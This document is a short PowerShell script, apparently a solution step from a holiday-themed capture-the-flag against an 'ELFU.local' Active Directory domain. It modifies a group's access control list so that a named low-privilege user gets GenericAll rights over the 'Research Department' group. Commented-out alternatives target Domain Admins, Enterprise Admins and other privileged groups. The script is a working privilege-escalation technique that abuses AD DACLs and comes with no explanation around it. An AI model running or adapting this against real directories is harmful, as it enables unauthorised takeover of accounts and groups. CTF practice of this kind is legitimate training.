
$username = "psmifmgudo"

Add-Type -AssemblyName System.DirectoryServices
# $ldapConnString = "LDAP://CN=Domain Admins,CN=Users,DC=ELFU,DC=local"
# $ldapConnString = "LDAP://CN=Enterprise Admins,CN=Users,DC=elfu,DC=local"
# $ldapConnString = "LDAP://CN=Administrators,CN=Builtin,DC=ELFU,DC=local"
# $ldapConnString = "LDAP://CN=Remote Management Domain Users,CN=Users,DC=ELFU,DC=local"
# $ldapConnString = "LDAP://CN=Remote Management Users,CN=Builtin,DC=ELFU,DC=local"
# $ldapConnString = "LDAP://CN=Domain Users,CN=Users,DC=ELFU,DC=local"
# $ldapConnString = "LDAP://CN=Cert Publishers,CN=Users,DC=ELFU,DC=local"
# $ldapConnString = "LDAP://CN=Key Admins,CN=Users,DC=ELFU,DC=local"
$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=ELFU,DC=local"

# $ADSI = [ADSI]"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"

$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
$IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
$secOptions = $domainDirEntry.get_Options()
$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
$domainDirEntry.RefreshCache()
$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
$domainDirEntry.CommitChanges()
$domainDirEntry.dispose()
